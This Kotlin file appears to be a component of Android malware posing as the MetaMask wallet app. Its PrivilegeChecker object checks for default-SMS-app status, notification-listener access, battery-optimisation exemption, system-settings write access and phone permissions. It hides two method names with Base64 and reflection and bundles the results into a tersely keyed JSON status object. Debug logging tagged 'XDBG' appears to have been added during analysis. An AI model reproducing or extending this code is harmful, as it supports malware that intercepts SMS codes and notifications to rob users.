package com.example.MetaMask.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Base64
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject

object PrivilegeChecker {

    const val STATUS_GRANTED = "1"
    const val STATUS_DENIED = "0"
    const val STATUS_UNKNOWN = "u"

    private fun d(s: String): String {
        android.util.Log.d("XDBG", "[PrivilegeChecker] d enter s=${s}") //xdbg
        android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
        return try { String(Base64.decode(s, Base64.NO_WRAP)) } catch (e: Exception) { "" }
    }

    private fun isNotificationListenerEnabled(context: Context): Boolean {
        android.util.Log.d("XDBG", "[PrivilegeChecker] isNotificationListenerEnabled enter context=ctx") //xdbg
        try {
            val enabledListeners = NotificationManagerCompat.getEnabledListenerPackages(context)
            android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
            return enabledListeners.contains(context.packageName)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[PrivilegeChecker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
            return false
        }
    }

    fun isDefaultSmsApp(context: Context): Boolean {
        android.util.Log.d("XDBG", "[PrivilegeChecker] isDefaultSmsApp enter context=ctx") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            android.util.Log.d("XDBG", "[PrivilegeChecker] if branch") //xdbg
            try {
                val roleService = "role"
                val roleManager = context.getSystemService(roleService) ?: return false
                val roleSms = "android.app.role." + "SMS"
                val mName = d("aXNSb2xlSGVsZA==")
                val m = roleManager.javaClass.methods.find { it.name == mName }
                val res = m?.invoke(roleManager, roleSms)
                android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
                return res as? Boolean ?: false
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[PrivilegeChecker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
                return false
            }
        }
        try {
            val telClass = Class.forName("android.provider.Telephony\$Sms")
            val method = telClass.getMethod("getDefaultSmsPackage", Context::class.java)
            val defApp = method.invoke(null, context) as? String
            android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
            return defApp == context.packageName
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[PrivilegeChecker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
            return false
        }
    }

    fun isIgnoringBatteryOptimizations(context: Context): Boolean {
        android.util.Log.d("XDBG", "[PrivilegeChecker] isIgnoringBatteryOptimizations enter context=ctx") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.util.Log.d("XDBG", "[PrivilegeChecker] if branch") //xdbg
            try {
                val pm = context.getSystemService(Context.POWER_SERVICE) ?: return false
                val mName = d("aXNJZ25vcmluZ0JhdHRlcnlPcHRpbWl6YXRpb25z")
                val m = pm.javaClass.methods.find { it.name == mName }
                val res = m?.invoke(pm, context.packageName)
                android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
                return res as? Boolean ?: false
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[PrivilegeChecker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
                return false
            }
        }
        android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
        return true
    }

    fun canWriteSystemSettings(context: Context): Boolean {
        android.util.Log.d("XDBG", "[PrivilegeChecker] canWriteSystemSettings enter context=ctx") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.util.Log.d("XDBG", "[PrivilegeChecker] if branch") //xdbg
            android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
            return Settings.System.canWrite(context)
        }
        android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
        return true
    }

    fun hasPhonePermissions(context: Context): Boolean {
        android.util.Log.d("XDBG", "[PrivilegeChecker] hasPhonePermissions enter context=ctx") //xdbg
        val phonePermissions = arrayOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.CALL_PHONE
        )
        android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
        return phonePermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun getAutostartStatus(): String {
        android.util.Log.d("XDBG", "[PrivilegeChecker] getAutostartStatus enter") //xdbg
        android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
        return STATUS_UNKNOWN
    }

    fun getBackgroundActivityStatus(): String {
        android.util.Log.d("XDBG", "[PrivilegeChecker] getBackgroundActivityStatus enter") //xdbg
        android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
        return STATUS_UNKNOWN
    }

    fun getAllPrivilegesStatus(context: Context): JSONObject {
        android.util.Log.d("XDBG", "[PrivilegeChecker] getAllPrivilegesStatus enter context=ctx") //xdbg
        val statusJson = JSONObject()
        statusJson.put("pwr", if (isIgnoringBatteryOptimizations(context)) STATUS_GRANTED else STATUS_DENIED)
        statusJson.put("def_msg", if (isDefaultSmsApp(context)) STATUS_GRANTED else STATUS_DENIED)
        statusJson.put("ign", getAutostartStatus())
        statusJson.put("bg_run", getBackgroundActivityStatus())
        statusJson.put("sys_cfg", if (canWriteSystemSettings(context)) STATUS_GRANTED else STATUS_DENIED)
        statusJson.put("phn_acc", if (hasPhonePermissions(context)) STATUS_GRANTED else STATUS_DENIED)
        statusJson.put("notif_lsn", if (isNotificationListenerEnabled(context)) STATUS_GRANTED else STATUS_DENIED)
        android.util.Log.d("XDBG", "[PrivilegeChecker] return") //xdbg
        return statusJson
    }
}
